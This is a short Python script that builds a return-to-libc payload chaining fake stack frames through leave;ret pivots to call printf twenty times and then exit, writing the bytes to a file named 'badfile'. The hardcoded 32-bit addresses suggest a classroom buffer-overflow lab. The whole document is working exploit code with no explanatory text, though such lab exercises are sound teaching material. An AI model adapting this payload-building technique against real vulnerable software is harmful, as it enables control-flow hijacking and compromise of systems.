#!/usr/bin/python3
import sys

def tobytes(value):
    return (value).to_bytes(4, byteorder='little')

leaveret    = 0x565562ce
sh_addr     = 0xffffd445
printf_addr = 0xf7e18d30
exit_addr   = 0xf7dfcec0
ebp_foo     = 0xffffc9d8

content = bytearray(0xaa for i in range(112))

ebp_next = ebp_foo + 0x20
content += tobytes(ebp_next)
content += tobytes(leaveret)
content += b'A' * (0x20 - 2*4)

for i in range(20):
    ebp_next += 0x20
    content += tobytes(ebp_next)
    content += tobytes(printf_addr)
    content += tobytes(leaveret)
    content += tobytes(sh_addr)
    content += b'A' * (0x20 - 4*4)

content += tobytes(0xFFFFFFFF)
content += tobytes(exit_addr)

with open("badfile", "wb") as f:
    f.write(content)
